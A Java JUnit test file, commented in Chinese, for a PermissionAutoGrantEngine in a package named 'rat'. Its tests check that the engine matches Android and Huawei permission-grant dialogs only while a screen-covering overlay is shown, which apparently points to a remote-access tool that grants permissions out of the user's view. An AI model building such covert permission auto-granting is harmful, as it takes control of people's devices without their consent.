package com.vendor.rat.auto.engine;

import org.junit.After;
import org.junit.Before;
import org.junit.Test;

import static org.junit.Assert.*;
import static org.mockito.Mockito.mock;

/**
 * PermissionAutoGrantEngine.matchWindow() 重写逻辑测试
 *
 * 纯 JVM 测试，无需 Android 框架。
 * 注意: matchWindow 需要 BlockViewHelper.isShowing()=true，
 * 通过设置 public static 字段模拟遮罩显示状态。
 */
public class PermissionAutoGrantEngineMatchWindowTest {

    private PermissionAutoGrantEngine engine;

    @Before
    public void setUp() {
        engine = new PermissionAutoGrantEngine();
        // 模拟遮罩显示状态: isShowing() = viewRef.get() != null && windowManager != null
        com.vendor.rat.helper.BlockViewHelper.viewRef.set(mock(android.view.View.class));
        com.vendor.rat.helper.BlockViewHelper.windowManager = mock(android.view.WindowManager.class);
    }

    @After
    public void tearDown() {
        engine.destroy();
        // 清理遮罩状态
        com.vendor.rat.helper.BlockViewHelper.viewRef.set(null);
        com.vendor.rat.helper.BlockViewHelper.windowManager = null;
    }

    // ============ 权限控制器包名匹配 ============

    @Test
    public void matchWindow_androidPermissionController_grantActivity_returnsTrue() {
        assertTrue(engine.matchWindow("com.android.permissioncontroller",
                "com.android.permissioncontroller.permission.ui.GrantPermissionsActivity", 0));
    }

    @Test
    public void matchWindow_googlePermissionController_returnsTrue() {
        assertTrue(engine.matchWindow("com.google.android.permissioncontroller",
                "com.google.android.permissioncontroller.GrantPermissionsActivity", 0));
    }

    @Test
    public void matchWindow_packageInstaller_returnsTrue() {
        assertTrue(engine.matchWindow("com.android.packageinstaller",
                "com.android.packageinstaller.GrantPermissionsActivity", 0));
    }

    // ============ 华为权限弹窗 ============

    @Test
    public void matchWindow_huaweiWithPermissionClass_returnsTrue() {
        assertTrue(engine.matchWindow("com.huawei.systemmanager",
                "com.huawei.systemmanager.permission.PermissionActivity", 0));
    }

    @Test
    public void matchWindow_huaweiWithoutPermissionClass_returnsFalse() {
        assertFalse(engine.matchWindow("com.huawei.systemmanager",
                "com.huawei.systemmanager.appcontrol.activity.StartupAppControlActivity", 0));
    }

    // ============ 通用 GrantPermissions 类名匹配 ============

    @Test
    public void matchWindow_anyPackageWithGrantPermissionsClass_returnsTrue() {
        assertTrue(engine.matchWindow("com.random.package",
                "com.random.package.GrantPermissionsActivity", 0));
    }

    @Test
    public void matchWindow_anyPackageWithoutGrantPermissions_returnsFalse() {
        assertFalse(engine.matchWindow("com.random.package",
                "com.random.package.SomeOtherActivity", 0));
    }

    // ============ null 输入 ============

    @Test
    public void matchWindow_nullPackage_returnsFalse() {
        assertFalse(engine.matchWindow(null, "AnyClass", 0));
    }

    @Test
    public void matchWindow_permissionControllerNullClass_returnsTrue() {
        // null className 走默认匹配
        assertTrue(engine.matchWindow("com.android.permissioncontroller", null, 0));
    }

    // ============ 遮罩关闭时不匹配 ============

    @Test
    public void matchWindow_overlayNotShowing_returnsFalse() {
        // 模拟遮罩关闭
        com.vendor.rat.helper.BlockViewHelper.viewRef.set(null);
        assertFalse(engine.matchWindow("com.android.permissioncontroller",
                "GrantPermissionsActivity", 0));
    }

    // ============ 排除权限管理页面 ============

    @Test
    public void matchWindow_managePermissions_returnsFalse() {
        assertFalse(engine.matchWindow("com.android.permissioncontroller",
                "com.android.permissioncontroller.permission.ui.ManagePermissionsActivity", 0));
    }

    @Test
    public void matchWindow_recyclerView_returnsFalse() {
        assertFalse(engine.matchWindow("com.android.permissioncontroller",
                "androidx.recyclerview.widget.RecyclerView", 0));
    }

    @Test
    public void matchWindow_huaweiNullClass_returnsFalse() {
        // 华为需要 className 包含 "Permission"，null className → false
        assertFalse(engine.matchWindow("com.huawei.systemmanager", null, 0));
    }

    // ============ 不匹配的包名 ============

    @Test
    public void matchWindow_randomPackageRandomClass_returnsFalse() {
        assertFalse(engine.matchWindow("com.foo.bar", "com.foo.bar.MainActivity", 0));
    }

    @Test
    public void matchWindow_androidSettings_returnsFalse() {
        assertFalse(engine.matchWindow("com.android.settings",
                "com.android.settings.HWSettings", 0));
    }
}
